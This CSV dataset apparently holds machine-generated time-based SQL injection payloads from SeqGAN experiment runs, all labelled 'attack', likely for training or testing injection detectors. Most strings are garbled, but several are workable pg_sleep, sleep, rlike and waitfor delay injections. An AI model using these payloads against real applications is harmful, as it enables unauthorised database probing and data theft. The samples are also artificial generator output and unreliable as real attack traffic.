label,payload,family,payload_type,method,run_id,sample_index
attack,"""   or 6456  6793,'0:0:2' sleep  5   =   waitfor 3885    e""ytr5    (  selectl do ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,144
attack,4240sve   )   0 4240 * 6969  (sleep_  (   TIME___  (  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,145
attack,1%'aa8781p. bsiiaoor pg_sleep  (  (__T5   select waitfor not   5  8140,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,146
attack,'   )    --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,147
attack,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""0sewaitfor5702  =  (  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,148
attack,";"" '0:0:__TIME__'(   (  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,149
attack,"1%'   )    or 6793 benchmark  select 8514  (  'isintegratedsecurityonly'   m1  8466   )    and   or  ""  )   or sleep  (  __TIME__  )    =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,150
attack,"""  ;m not  (  5   )    or not  (  5   )         ,,f delay  6793 pg_sleep  (  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,151
attack,"""o)    )and '0:0:2' delaye8036",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,152
attack,"a%)""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  "":hcf",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,153
attack,"1 * 8514  (  5000000,8140dsleep  (  (___TIMZ  E___31141361sleep  (  5   )    )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,154
attack,""",1   )    )    oresleep  (   = s  9443    )   a_ benchmark  sleep  9443 pg_sleep  (  (  5000000,mdMd5  5  ),1  )   and 'sa' --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,155
attack,"""   and   8781 from",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,156
attack,;' ifeu @pepervklery  (  3114  (  5  )  )   or,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,157
attack,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""tq['0:0:10'3%%    or    E___TIMu_E______TME_TIME_______  _____TIME____T--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,158
attack,"""   ) where sleep  (  )--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,159
attack,"1%'||  (  select 'whenib""   )    or 8781  =  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,160
attack,"      ),waitfor --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,161
attack,1   zvi)  )    3114or pg_sleep  10000000   (  5   )    or 6784  (#,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,162
attack,"1%'||  (  select 'ax""'pze    rrlriiarrptn  =benchmark,waitfor  =  ,  3114 *tTIM___T5   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,163
attack,%j1dnot,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,164
attack,"1'   )   or 2388  (  5MT5   )    )    a    ),oro( '0:0:2' fromerp*8781____T____TIME____TIME____TIM '0:0:2'   (  ,* not  (  5   )    or 4287  (    (     select  pg_sleep  (  5   )    #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,165
attack,"1'||  (  select 'k'||  (  select '"" or sleep  (  __TIME__  )    =  ""#),or * pg_sleep  0x6d457153   sleep  (  5   )    and 9443 pg_sleep  (  5   <>  3114l--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,166
attack, '0:0:10' delay where  (  5   #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,167
attack,"1%%""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""ciqopg_sleepshsleep  E__TIME_______T#",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,168
attack,1 @W6866 from,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,169
attack,m8594  )or --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,170
attack,"M1waitforcfa      ao0u""  )   or sleep  (  __TIME__  )    =  ""bscep ytr5  8594_T__TIMbenchmark,Met_______T0x6d457153   or 6793sleep --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,171
attack,"""   select  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,172
attack,"1'||  (  select 's""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""cirn",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,173
attack,1hrihpg_sleepeer  =  5   )    )    or sleep  5  (  )    )   orTME_____TIME____TIME_T4240  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,174
attack,"@etide   (  0x6d457153   2657  waitfor   31144240,maspiaj( or e  (  5  )    or 1 endbenchmark  select 1361,benchmark  (  select benchmark  (  0x6d457153   _  5873",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,175
attack,"' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,176
attack,1'sa'd' 6793,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,177
attack,;sleep' and,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,178
attack,"lr   ,  andt(obenchmark  (   waitfor    __((select 7739  (_T--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,179
attack,"""   >hec",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,180
attack,   )    orsleep   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,181
attack,"""   )    asnpg_sleep  (    (  )    )    asernt_________TIME_  selectT(  )    #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,182
attack,1L8036   waitfor,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,183
attack,"'||  (  select 'jc"" or sleep  (  __TIME__  )    =  "" '0:0:__TIME__'delaydlnot  (   )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,184
attack,""",(  ,5  =  5        )    or(   ""   )    #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,185
attack,"1%""'||  (  select '   )    ansnsdocic'don#  2657 s    eyt'isintegratedsecurityonly'  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,186
attack,"1"",1'  )  or86969 50  )--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,187
attack,"1"",waitfor delaye(    benchmark  (  5)   or 6793 ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,188
attack,#   )    --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,189
attack,1',time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,190
attack,'; 9862 '0:0:2' not   'enpn'sleep  (  __T--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,191
attack,"""   )    aserossipe25  (  'isintegratedsecurityonly'   )    or  (  )   and  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,192
attack,;waitfor 2388  =  (  3114__TIME____________  select,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,193
attack,";""   )    waitfor delay and --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,194
attack, N    (  substringtbenchmark(_TIM&  (  select @5  (  <>  3114  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,195
attack,;e~veont,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,196
attack,"1%'||  (  select '""  )   or sleep  (  __TIME__  )    =  ""' waitfor delay '"" like ""where   sleep  0x76555642   )    -- information_schema pg_sleep  (   select (  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,197
attack,1%'   )    )    --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,198
attack,"merss  )   )   or 4240   (_TIM(__  0x4c4d6142  5   waitfor  )   waitfor sleepet_____  5000000,delay",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,199
attack,"1   select'   2657 wr vrrselect  6784,rsihvit(  ;not  sleep  (  ,md5  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,200
attack,5  or --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,201
attack,p0end  )    )    or 0d   emer  )  )   or 4240@6969tsselecteq  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,202
attack,"1   )    awaitforwaitfor  '   )    )    rlike sleep  (  5  )   and    (    (   ', ar * 3824  (  select from",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,203
attack,"esrerbrsert9862  (  ,,1   )--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,204
attack,"if ,meeretpelrtwipwhereerdonyeir_n  1361(   nxx2657e hwaitforllrt  7739q",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,205
attack,"'M_,--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,206
attack,where0slike vioor  (  ) delay 8514=_    3114__  (  )    ) *and--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,207
attack,"o,1361  (      --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,208
attack,1'( 6784  =  5sleep  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,209
attack,"1%%'sa'fz<>' waitfor delay '>l:sdelayl@2840""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""v""5  (  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,210
attack,";o6456as  rrsiiwhere  whereeoe  8140  )    et waitforllr  7629,5  (    4287_   5   )   6866or",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,211
attack,"1s0x694a4745""  asieu)    ort5466 pg_sleep  ,ME_____TIME5   >    )   waitfor not  (  3114  3114,sleep  md5  )t",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,212
attack,"1 where or waitforet--e    e (    (  sleep  (  (  =TIm   )    )   a""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""srxbsepion  (  ~",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,213
attack,1   )   waitforwaitfor 8781  8781 2388 if d Q  ( sleep  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,214
attack,1dxt'enpn'vs@pet crctonon if ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,215
attack,""" waitfor  (  select from",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,216
attack,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""c   )08)   or sleep  m   (  'enpn'  )    sleep--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,217
attack,;l   2657  5rtk0pke'0:0:__TIME__'7260 from where not  (  (  (  _TIME_______TIME_______TIME_TIME____TIME____T--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,218
attack,"1%'||  (  select '""1'||  (  select ''  =  'kJ       )    aserrphwaitfor",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,219
attack,1   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,220
attack,af%li      asioor,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,221
attack,"1 from'  f delay and from  ,mdpser  (  10000000<>  from  5   :(  n   and  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,222
attack,'0:0:10' or  or pg_sleep  (  5   )    )   waitfor and 6969 es ter  (  )       )     or *  (,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,223
attack,"1%'||  (  select 'f""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""r   25",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,224
attack, )    or 4240 6969  =  substring   (  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,225
attack,"Muita""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,226
attack,"'enpn')   andbenchmarkerrwdsleep    5,erert5  =  5   select ( e    ,mee  (  )    and     Iselect   as os    tsrv:iirir  ,   waitfor  sleep  (  )     ,,mr   6784   select if sleep  (   )7'sysadmin'    (  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,227
attack,'   )    9443 yet_ n  (  (     --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,228
attack,i:v '0:0:__TIME__''0:0:__TIME__'from1   )    or pg_sleep   select ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,229
attack," ,(setsse10  ,aJn  (  , where 'sa' 1361 6793 sleep  ,(  )   select not  (  ,,D5  (  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,230
attack,1   )    or from,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,231
attack,"   acasin@ctycc""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""dtn(  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,232
attack,"',orlr  (  5   5000000select sleep  (   select",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,233
attack,"'||  (  select '""   )    or",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,234
attack,1'||  (  select '   and   'sa' delay 6793 2388  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,235
attack,from,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,236
attack,aor 4240  syr from,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,237
attack, s  (  select pg_sleep  (  0x544d5a4c   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,238
attack,"u""'   waitforl--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,239
attack," ortE delay d=____(  5   <>  eruend  ;,periqfromtio    or   8140 information_schemaroneriqdn  (  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,240
attack,"'||  (  select '= benchmark  sleep  (  5    )  ,>or pg_sleep  (  _____TIMT'isintegratedsecurityonly'  ',--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,241
attack,   )    =,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,242
attack,"1'   )   )    or where and   (  sleep  (  benchmark  _,Mdo    7739",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,243
attack,"1%""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""kj where'0:0:2'",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,244
attack,";1'||  (  select 't'srn ""  )    or  (  6866  5       ,; or benchmark(  select 4240  6784  =  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,245
attack,"1%%""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""cb"" or sleep  (  __TIME__  )    =  """"",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,246
attack,; *--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,247
attack,1%fnhaoinot,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,248
attack,"1'||  (  select '""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""0iG0ert5_____TIM_  =__TIME____Tbenchmark  ,m(  5  (  1   (   and   (  --  5   )   like * select pg_sleep  (  5  )    or from pg_sleep  (  (  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,249
attack,"""  =  ""' or sleep  (  10000000(   )    )    )   aeaeo<>',e  or sleep  (  5000000),--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,250
attack,"w""--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,251
attack,""" 7739  94435466___TIME__T)   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,252
attack,"1%1%%""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""whenM0hek'  =  'o' (  ,d5      5alred""  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,253
attack,waitfor delay p and --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,254
attack,1'||  (  select '10,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,255
attack,"1""   select '0:0:__TIME__'6866 from   sleep  (  )    --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,256
attack,g' from not  y ett'  (   )    or pg_sleep  select pg_sleep from  sleep  (  5   #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,257
attack,1   3885i waitfor 6456ltu 7739   (      (  0x544d5a4c  when --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,258
attack,cwherewhere2657   'isintegratedsecurityonly',time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,259
attack,";1%""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""sxein pg_sleep  (  'isintegratedsecurityonly'   (  sleep  5000000T_TIM4287  (  (  T   )    #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,260
attack,1l9862,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,261
attack,; 8781 waitford 0vuhirl:25desleep  (  5873   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,262
attack,",""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,263
attack,"1'   )   <> aserssr wherewhere  (  H 1361  )    aser_  = '0:0:__TIME__' from,sleep  (  (  ME__Tand   8781  (  sleep  )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,264
attack,8036   )    or pg_sleep E_  5   )    )a,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,265
attack,")    or sleep  10000000,MET,M'isintegratedsecurityonly'  }  )    a#",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,266
attack,"'   ,or  i; where  select T(    select * @     5702 6793,ndo--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,267
attack,'||  (  select 'i:r3cf#' waitfor delay 'y,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,268
attack,u   ),time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,269
attack,"x""  )  )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,270
attack,1%'||  (  select 'ieier'sysadmin'sy  5)    or @7739e @v5  (  (  _--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,271
attack,gpg_sleep  )   and if 2388--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,272
attack,l0   )    s0vubfrom,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,273
attack,1'  )   or (,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,274
attack,"""   )    <>1 erod  (  )   or",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,275
attack,; if where 0 k --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,276
attack,"1"" e;  (  )    6784 0 --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,277
attack,"1%""    cno0se0d;abwaitfor  0 1361tp delay where etwosleep  (  5000000,,   (  __  5  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,278
attack,"1'||  (  select '0'||  (  select '^thena""ab ooh@vrero25or",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,279
attack,"1%""   aw iesr a""  =  "" 8781  4287 e   (  substring   )    or benchmark  _  ____T--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,280
attack,";""   x1   lselect at",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,281
attack,ife(  ))--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,282
attack,e   sve:orlD25,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,283
attack,"""  )   or sleep  (  __TIME__  )    =  ""or",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,284
attack,; oror pg_sleep  (  (   6866  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,285
attack,'1   )    or,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,286
attack,1%'   )    or  (  (  5   )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,287
attack,   0x76555642    #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,288
attack,"<cnoand not  (  'isintegratedsecurityonly'   )seD5  (  select pg_sleep  5  I   )       )    )           where waitfor     l pnot  sleep  (  (  5u,5   (select  (  select  (  10000000select '0:0:__TIME__'",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V2__sql_aware__len160__gpre60__reward_off__seed88,289
